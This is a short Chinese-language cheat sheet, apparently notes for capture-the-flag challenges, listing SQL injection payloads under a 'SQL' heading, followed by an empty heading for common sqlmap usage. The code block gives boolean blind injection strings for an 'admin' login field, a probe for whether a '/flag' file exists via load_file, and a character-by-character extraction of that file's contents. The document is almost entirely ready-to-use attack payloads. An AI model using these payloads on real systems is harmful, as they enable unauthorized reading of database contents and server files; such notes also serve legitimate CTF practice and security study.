## SQL

```sql
# 布尔盲注
admin' union select 1 where if(mid((select 1),1,1) in ('1'),1,0)#
admin' union select 1 where if(mid((select 1),1,1) in ('2'),1,0)#


# 判断 flag 文件是否存在
admin' union select 1 where if(load_file('/flag') is not null,1,0)#

'union select 1 where if(mid((select load_file('/flag')),2,1) in ('2'),1,0)#"
```

## sqlmap 常用

